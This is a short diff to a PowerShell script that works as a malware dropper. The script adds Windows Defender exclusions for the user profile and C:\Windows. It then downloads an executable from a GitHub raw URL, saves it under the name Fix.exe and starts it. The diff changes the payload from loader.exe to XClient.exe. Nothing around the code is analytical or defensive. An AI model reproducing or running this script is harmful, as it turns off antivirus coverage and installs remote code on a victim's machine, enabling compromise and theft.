@@ -1,6 +1,6 @@
 Add-MpPreference -ExclusionPath $env:USERPROFILE
 Add-MpPreference -ExclusionPath C:\Windows
-$url = "https://github.com/naruto3213213/111/raw/refs/heads/main/loader.exe"
+$url = "https://github.com/naruto3213213/111/raw/refs/heads/main/XClient.exe"
 $output = "$env:Fix.exe"
 Invoke-WebRequest -Uri $url -OutFile $output
 Start-Process -FilePath $output
